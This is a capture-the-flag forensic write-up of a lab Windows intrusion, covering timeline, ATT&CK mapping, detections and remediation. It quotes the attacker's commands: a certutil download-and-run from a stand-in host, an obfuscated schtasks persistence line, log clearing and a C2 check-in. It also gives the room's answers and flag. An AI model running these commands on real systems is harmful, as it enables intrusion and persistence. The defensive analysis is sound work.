# TryHackMe: Handbook for the Recently Compromised: Forensic Writeup

| | |
|---|---|
| **Room** | Handbook for the Recently Compromised |
| **Category** | Windows Forensics / Log Analysis / EVTX |
| **Difficulty** | Easy |
| **Evidence** | `Microsoft-Windows-Sysmon%4Operational.evtx`, `PowerShell-Operational.evtx` |
| **Affected host / user** | `THM-JCOLLINS` / `j.collins` |
| **Verdict** | Confirmed compromise via a malicious HTA attachment, living-off-the-land payload retrieval, scheduled-task persistence |

---

## 1. Executive Summary

A Windows workstation was flagged for anomalous activity. Two event log sources were provided: **Sysmon** (process creation, file creation, DNS) and **PowerShell Operational** (script block logging, Event ID 4104).

The analysis shows that user `j.collins` opened an HTA file, `pipeline-check.hta`, from the Downloads folder. It was executed by the Windows scripting host `mshta.exe`. The HTA spawned a hidden PowerShell process that **hid the name of a trusted binary behind a wildcard** (`certu*.exe`) to evade simple string-based detections. The binary, `certutil.exe`, then downloaded a second-stage script, `pipeline-sync.ps1`, from an attacker-controlled host.

The second-stage script did four things:

1. It beaconed to the attacker's infrastructure with a string-concatenation-obfuscated URL.
2. It created a **scheduled task** (`StudioPipelineSync`) that runs at every logon with the highest privileges.
3. It decoded a Base64 blob that had been split into fragments.
4. It wrote the decoded value to a staging file, `%TEMP%\PipelineSync\.sync-cache`. This value is the room flag.

Log-clearing activity (`wevtutil cl`) is also present, which is a defense-evasion indicator.

---

## 2. Methodology and Tooling

The `.evtx` files were parsed offline. Any of these approaches works:

- **Windows / GUI:** Event Viewer, or Eric Zimmerman's *EvtxECmd* plus Timeline Explorer
- **Windows / CLI:** `Get-WinEvent -Path <file>.evtx`
- **Linux:** `python-evtx` (used here), `evtx_dump`, or Chainsaw/Hayabusa for Sigma-based triage

For this writeup I exported both logs to XML and filtered Sysmon on the events that matter most for intrusion reconstruction:

| Sysmon Event ID | Meaning | Why it matters here |
|---|---|---|
| 1 | Process Create | Parent/child chains, command lines |
| 3 | Network Connection | C2 / download channels |
| 11 | File Create | Dropped payloads and staging files |
| 13 | Registry Value Set | Registry-based persistence |
| 22 | DNS Query | Attacker infrastructure resolution |

| PowerShell Event ID | Meaning |
|---|---|
| 4104 | Script Block Logging (the *de-obfuscated, as-executed* code) |

Analyst note from the room brief: *start with timestamps, then compare accounts, processes and commands.* The approach is therefore to build the timeline first and answer the questions from it.

---

## 3. Reconstructed Attack Timeline (UTC)

| Time (UTC) | Source | Event | Assessment |
|---|---|---|---|
| 05:00:46 | Sysmon EID 1 | `wevtutil.exe cl Microsoft-Windows-Sysmon/Operational` (parent `powershell.exe`) | Log clearing (T1070.001). Precedes the main intrusion and is consistent with environment preparation or tampering |
| 05:00:49 | Sysmon EID 1 | `wevtutil.exe cl Microsoft-Windows-PowerShell/Operational` | Same as above |
| 05:01:04 | Sysmon EID 1 | Interactive `powershell.exe` launched by `explorer.exe` as `j.collins` | User-launched shell |
| 05:01:08 – 05:01:22 | Sysmon EID 1 | `whoami.exe`, `ipconfig.exe`, `tasklist.exe`, `notepad.exe` spawned from PowerShell | Host and network discovery pattern (T1033, T1016, T1057). Alone it looks benign, but it fits the "isolated events look ordinary" hint |
| **05:02:05** | Sysmon EID 1 | `mshta.exe "C:\Users\j.collins\Downloads\pipeline-check.hta"` (parent `explorer.exe`) | **Initial execution: user double-clicked the HTA** |
| **05:02:05** | Sysmon EID 1 | `powershell.exe -nop -w hidden -c "& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 ..."` (parent `mshta.exe`) | HTA spawns hidden PowerShell with a wildcard-obfuscated utility |
| **05:02:06** | Sysmon EID 1 | `certutil.exe -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 ...\Temp\pipeline-sync.ps1` | **Ingress Tool Transfer (T1105)** |
| 05:02:06 | Sysmon EID 11 | `certutil.exe` writes `INetCache\IE\...\pipeline-sync[1].ps1` and `%TEMP%\pipeline-sync.ps1` | Payload landed on disk |
| 05:02:06 | Sysmon EID 1 | `powershell.exe -ep bypass -f ...\Temp\pipeline-sync.ps1` | Second stage executed, ExecutionPolicy bypassed |
| **05:02:08** | Sysmon EID 1 | `schtasks.exe /create /tn StudioPipelineSync ... /sc onlogon /rl highest /f` | **Persistence** |
| 05:02:09 / 05:02:10 | Sysmon EID 22 | DNS queries for `pipeline-cdn.thm` | Beacon / check-in to attacker infrastructure |
| 05:02:xx | PS EID 4104 | Script block containing the Base64 blob decode and `Set-Content ...\.sync-cache` | **Flag staged** |

The whole intrusion, from the HTA launching to persistence being established, took roughly **three seconds**, which indicates a fully scripted payload.

---

## 4. Step-by-Step Walkthrough with Answers

### Task 1: The utility hidden behind a wildcard

> *A trusted Windows utility downloaded a second-stage script onto the host. The command that called the utility obscured its name with a wildcard. What is the utility's full executable name?*
> Answer format: `********.***`

**Approach.** I filtered Sysmon Event ID 1 (Process Create) on the process spawned by `mshta.exe`. The child PowerShell command line contains:

```text
powershell.exe -nop -w hidden -c "& ((gci C:\Windows\System32\certu*.exe)[0].FullName) -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 $env:TEMP\pipeline-sync.ps1; powershell -ep bypass -f $env:TEMP\pipeline-sync.ps1"
```

**Analysis.**

- `gci C:\Windows\System32\certu*.exe` resolves the binary at runtime through globbing. Static detections looking for the literal string `certutil` in the command line are bypassed.
- `-nop` (no profile), `-w hidden` (hidden window) and `-ep bypass` (execution policy bypass) are classic hallmarks of malicious PowerShell.
- Sysmon records the *resolved* execution immediately afterward, which unmasks the wildcard:

```text
"C:\Windows\System32\certutil.exe" -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 C:\Users\J1B0B~1.COL\AppData\Local\Temp\pipeline-sync.ps1
```

`certutil.exe` is a legitimate certificate-management LOLBin that is frequently abused for file download via `-urlcache -f`.

**Answer:**

```text
certutil.exe
```

---

### Task 2: URL of the second-stage script

> *What full URL did the utility retrieve the second-stage script from?*
> Answer format: `****://************.***:****/*************.***`

**Approach.** The same Process Create event (and the PowerShell 4104 script block) contains the full URL. It matches the answer format exactly: a non-standard port (`8088`), a hostname, and a `.ps1` file.

**Corroboration.**

- **Sysmon EID 22 (DNS)** shows `pipeline-cdn.thm` being resolved at 05:02:09 and 05:02:10.
- **Sysmon EID 11 (File Create)** shows `certutil.exe` writing `pipeline-sync[1].ps1` to the WinINet cache and `pipeline-sync.ps1` to `%TEMP%`. Both are artifacts of the `-urlcache` download.

**IOCs:**

| Type | Value |
|---|---|
| Domain | `pipeline-cdn.thm` |
| Port | `8088/tcp` |
| URL | `http://pipeline-cdn.thm:8088/pipeline-sync.ps1` |
| File | `C:\Users\j.collins\AppData\Local\Temp\pipeline-sync.ps1` |

**Answer:**

```text
http://pipeline-cdn.thm:8088/pipeline-sync.ps1
```

---

### Task 3: Abuse of the Windows scripting host (initial attachment)

> *Which MITRE ATT&CK sub-technique describes the abuse of the Windows scripting host that executed the initial attachment?*
> Answer format: `*****.***`

**Approach.** I traced the parent/child chain backwards from the `certutil` download:

```text
explorer.exe
 └─ mshta.exe "C:\Users\j.collins\Downloads\pipeline-check.hta"
     └─ powershell.exe -nop -w hidden -c "& ((gci ...certu*.exe)[0] ..."
         ├─ certutil.exe -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1 ...
         └─ powershell.exe -ep bypass -f ...\pipeline-sync.ps1
             └─ schtasks.exe /create /tn StudioPipelineSync ...
```

**Analysis.**

- `.hta` (HTML Application) files are executed by **`mshta.exe`**, a signed Microsoft binary that interprets embedded VBScript or JScript outside the browser sandbox.
- The parent is `explorer.exe` and the file sits in `Downloads`, which indicates user-driven execution of a downloaded attachment (phishing-style delivery).
- Because `mshta.exe` is a trusted Microsoft binary used as a proxy to run arbitrary script content, the matching technique is **System Binary Proxy Execution: Mshta**.

| ATT&CK | Name |
|---|---|
| Tactic | Defense Evasion (TA0005) |
| Technique | T1218 System Binary Proxy Execution |
| **Sub-technique** | **T1218.005 Mshta** |

Related techniques observed in the same chain: T1204.002 (User Execution: Malicious File), T1059.001 (PowerShell), and T1105 (Ingress Tool Transfer).

**Answer:**

```text
T1218.005
```

---

### Task 4: Persistence mechanism

> *Which MITRE ATT&CK sub-technique describes the persistence mechanism the intruder configured?*
> Answer format: `*****.***`

**Approach.** I searched Sysmon Event ID 1 for persistence-related binaries (`schtasks.exe`, `reg.exe`, `sc.exe`, `wmic.exe`). One hit stands out at 05:02:08:

```text
"C:\Windows\system32\schtasks.exe" /create /tn StudioPipelineSync /tr "powershell -nop -w hidden -f C:\Users\j.collins\AppData\Roaming\PipelineSync\pipeline-sync.ps1" /sc onlogon /rl highest /f
```

**Parameter breakdown:**

| Switch | Meaning |
|---|---|
| `/create /tn StudioPipelineSync` | Creates a task named to resemble legitimate software ("Studio Pipeline Sync"). This is **masquerading** |
| `/tr "powershell -nop -w hidden -f ...pipeline-sync.ps1"` | The action: re-run the malicious script silently |
| `/sc onlogon` | Trigger: every user logon |
| `/rl highest` | Run with the highest privilege available to the account |
| `/f` | Force-overwrite any existing task of the same name |

The PowerShell 4104 log shows the script *building this command from string fragments*, another obfuscation layer designed to defeat keyword matching:

```powershell
schtasks /create /tn ('S'+'tu'+'dioPi'+'pe'+'li'+'neSyn'+'c') /tr (-join('pow','e','rshe','l','l -nop',' -','w hi','dden -','f C:\U','se','rs\j','.','collins','\AppDat','a\Roamin','g\Pipeli','neSyn','c\','pi','pelin','e-sync','.p','s','1')) /sc onlogon /rl highest /f
```

| ATT&CK | Name |
|---|---|
| Tactic | Persistence (TA0003), Privilege Escalation (TA0004), Execution (TA0002) |
| Technique | T1053 Scheduled Task/Job |
| **Sub-technique** | **T1053.005 Scheduled Task** |

**Answer:**

```text
T1053.005
```

---

### Task 5: The flag

> *What is the flag?*
> Answer format: `***{***_*****_****_***_****}`

**Approach.** The format hint (`THM{...}` with underscore-separated words) suggests the flag is hidden or encoded inside the second stage. The PowerShell Operational log (Event ID 4104) records the contents of `pipeline-sync.ps1` as executed. This is where the flag appears.

**Relevant script block:**

```powershell
try { Invoke-WebRequest -Uri (-join('htt','p://pip','el','ine','-cdn.th','m:','808','8/check','in')) -UseBasicParsing -TimeoutSec 3 | Out-Null } catch {}
schtasks /create /tn ('S'+'tu'+'dioPi'+'pe'+'li'+'neSyn'+'c') /tr (...) /sc onlogon /rl highest /f
$blob = ('VEhNe3R'+'IM19Ha'+'D'+'BzdF93MX'+'RIX1Ro'+'M19'+'NMDVUfQ='+'=')
$flag = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($blob))
$dir = ($env:TEMP + ('\Pipe'+'lineS'+'ync'))
New-Item $dir -ItemType Directory -Force | Out-Null
Set-Content ($dir + ('\.sy'+'nc-c'+'ach'+'e')) $flag
```

**What the script does:**

1. **C2 check-in:** concatenates the string `http://pipeline-cdn.thm:8088/checkin` and requests it. This matches the DNS queries for `pipeline-cdn.thm` seen in Sysmon.
2. **Persistence:** creates the scheduled task (Task 4).
3. **Staging:** reassembles a Base64 string from fragments, decodes it, and writes it to a hidden-style cache file, `%TEMP%\PipelineSync\.sync-cache`.

**Decoding.** Joining the concatenated fragments gives:

```text
VEhNe3RIM19HaDBzdF93MXRIX1RoM19NMDVUfQ==
```

```bash
echo 'VEhNe3RIM19HaDBzdF93MXRIX1RoM19NMDVUfQ==' | base64 -d
```

In PowerShell on Windows:

```powershell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('VEhNe3RIM19HaDBzdF93MXRIX1RoM19NMDVUfQ=='))
```

**Answer:**

```text
THM{tH3_Gh0st_w1tH_Th3_M05T}
```

---

## 5. MITRE ATT&CK Mapping Summary

| Tactic | Technique | ID | Evidence |
|---|---|---|---|
| Initial Access / Execution | User Execution: Malicious File | T1204.002 | `pipeline-check.hta` opened from Downloads by `explorer.exe` |
| Defense Evasion | System Binary Proxy Execution: Mshta | **T1218.005** | `mshta.exe` executing the HTA |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | `-nop -w hidden -ep bypass` command lines |
| Defense Evasion | Obfuscated Files or Information | T1027 | Wildcard `certu*.exe`, split strings, fragmented Base64 |
| Command and Control | Ingress Tool Transfer | T1105 | `certutil -urlcache -f http://pipeline-cdn.thm:8088/pipeline-sync.ps1` |
| Persistence | Scheduled Task/Job: Scheduled Task | **T1053.005** | `schtasks /create /tn StudioPipelineSync /sc onlogon /rl highest` |
| Defense Evasion | Masquerading | T1036 | Task name `StudioPipelineSync` mimics legitimate software |
| Discovery | System Owner/User, Network Config, Process Discovery | T1033, T1016, T1057 | `whoami`, `ipconfig`, `tasklist` |
| Defense Evasion | Indicator Removal: Clear Windows Event Logs | T1070.001 | `wevtutil cl` against Sysmon and PowerShell logs |

---

## 6. Indicators of Compromise

| Category | Indicator |
|---|---|
| Host / user | `THM-JCOLLINS` / `j.collins` |
| Initial file | `C:\Users\j.collins\Downloads\pipeline-check.hta` |
| Second-stage URL | `http://pipeline-cdn.thm:8088/pipeline-sync.ps1` |
| C2 check-in URL (reassembled) | `http://pipeline-cdn.thm:8088/checkin` |
| Domain / port | `pipeline-cdn.thm` / `8088` |
| Dropped script | `%TEMP%\pipeline-sync.ps1` (and INetCache copy `pipeline-sync[1].ps1`) |
| Staging file | `%TEMP%\PipelineSync\.sync-cache` |
| Persistence | Scheduled task `StudioPipelineSync` (on logon, highest privileges) |
| Persistence target | `C:\Users\j.collins\AppData\Roaming\PipelineSync\pipeline-sync.ps1` |
| Behavioral | `mshta.exe` spawning `powershell.exe`; `certutil.exe -urlcache -f`; `-nop -w hidden -ep bypass` |

> **Analyst caveat:** the task points to a copy of the script in `AppData\Roaming\PipelineSync\`, but the supplied logs do not show that copy being created. On a live host, verify whether that path exists. Its absence would mean the persistence is a dangling task, but it should be removed either way.

---

## 7. Detection Opportunities

**Sigma-style logic (pseudocode):**

```yaml
title: Mshta Spawning PowerShell
logsource: { product: windows, category: process_creation }
detection:
  selection:
    ParentImage|endswith: '\mshta.exe'
    Image|endswith: '\powershell.exe'
  condition: selection
level: high
```

```yaml
title: Certutil Download via UrlCache
logsource: { product: windows, category: process_creation }
detection:
  selection:
    Image|endswith: '\certutil.exe'
    CommandLine|contains|all: ['-urlcache', 'http']
  condition: selection
level: high
```

```yaml
title: Scheduled Task Created With Logon Trigger Running Hidden PowerShell
logsource: { product: windows, category: process_creation }
detection:
  selection:
    Image|endswith: '\schtasks.exe'
    CommandLine|contains|all: ['/create', '/sc onlogon', 'powershell']
  condition: selection
level: high
```

**Takeaways for detection engineering:**

1. **Do not rely on string matching alone.** `certu*.exe` defeats naive `certutil` keyword rules. Detect on **behavior and process lineage** (Sysmon EID 1 with resolved image), and use script block logging (EID 4104), which captures de-obfuscated code.
2. **Parent/child relationships are high-fidelity signals.** `mshta.exe` → `powershell.exe` has very few legitimate uses.
3. **Forward logs off-host.** The attacker could clear local logs with `wevtutil cl`, so central collection (SIEM) is critical. Monitor Event ID 1102 (Security) and 104 (System) for log clearing.

---

## 8. Remediation and Recommendations

**Immediate containment**

1. Isolate `THM-JCOLLINS` from the network.
2. Block `pipeline-cdn.thm` and port `8088` at the DNS, proxy and firewall layers.
3. Delete scheduled task `StudioPipelineSync` (`schtasks /delete /tn StudioPipelineSync /f`) and remove `%TEMP%\pipeline-sync.ps1`, `%TEMP%\PipelineSync\` and `AppData\Roaming\PipelineSync\`.
4. Reset credentials for `j.collins` and review for lateral movement, given the task ran with `/rl highest`.

**Hardening**

- Block or restrict `.hta` execution (ASR rules, AppLocker/WDAC, or removing the `mshta.exe` file association for standard users).
- Apply ASR rules such as *"Block process creations originating from PSExec and WMI commands"* and *"Block execution of potentially obfuscated scripts."*
- Enable PowerShell Constrained Language Mode, AMSI, and Script Block / Module / Transcription logging.
- Restrict outbound access for `certutil.exe` via egress filtering or application control.
- Provide phishing and attachment-handling awareness training for end users.

---

## 9. Final Answer Sheet

```text
certutil.exe
```

```text
http://pipeline-cdn.thm:8088/pipeline-sync.ps1
```

```text
T1218.005
```

```text
T1053.005
```

```text
THM{tH3_Gh0st_w1tH_Th3_M05T}
```

---

## 10. Lessons Learned

- A single event such as `whoami`, `ipconfig` or `tasklist` is noise. The **sequence** (HTA → mshta → hidden PowerShell → certutil → schtasks) is the story.
- Obfuscation (wildcards, string concatenation, fragmented Base64) hides intent from static detections, but **Script Block Logging and Sysmon capture the post-resolution reality**.
- Attackers clear logs. That is why centralized logging matters.
